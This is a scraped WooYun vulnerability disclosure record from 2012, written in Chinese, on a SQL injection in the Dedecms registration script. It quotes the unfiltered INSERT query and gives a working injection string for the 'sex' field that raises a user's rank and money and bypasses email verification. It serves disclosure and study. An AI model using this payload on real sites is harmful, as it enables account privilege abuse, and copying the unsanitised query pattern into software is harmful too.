{"id": 19736, "wybug_id": "wooyun-2012-06600", "wybug_title": "Dedecms SQL注射导致审核机制绕过漏洞", "wybug_corp": "Dedecms", "wybug_author": "c4rp3nt3r", "wybug_date": "2012-05-02 11:44", "wybug_open_date": "2012-06-16 11:45", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "语句注射", "字符型注射", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-02：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-06-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Dedecms 存在SQL注射漏洞,在magic_quotes_gpc=off时,攻击者可以将恶意SQL语句带入SQL执行,导致dedecms的审核机制被绕过. 详细说明：  需要magic_quotes_gpc=off,同样没有什么大危害的漏洞.漏洞代码如下:\n我们看 member/reg_new.php的代码 $sex变量在表单是单选，程序员没做任何过滤   191\t        $inQuery = \"INSERT INTO `#@__member` (`mtype` ,`userid` ,`pwd` ,`uname` ,`sex` ,`rank` ,`money` ,`email` ,`scores` ,   192\t        `matt`, `spacesta` ,`face`,`safequestion`,`safeanswer` ,`jointime` ,`joinip` ,`logintime` ,`loginip` )   193\t       VALUES ('$mtype','$userid','$pwd','$uname','$sex','10','$dfmoney','$email','$dfscores',   194\t       '0','$spaceSta','','$safequestion','$safeanswer','$jointime','$joinip','$logintime','$loginip'); \";   195\t        if($dsql->ExecuteNoneQuery($inQuery))我们提交 $sex=boy',100,100,'sss@xx.xx',1000,0,0,'face',0,'',1316751900,'',1316751900,'');%00直接把rank 跟money都设置为100了等，绕过邮件审核。\n   漏洞证明：  \n\n   修复方案：  略   版权声明：转载请注明来源 c4rp3nt3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-06-13 22:13 |    \t\t噬魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:141 漏洞数:37        | 08安全团队)\t\t \n  沙发沙发沙发    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}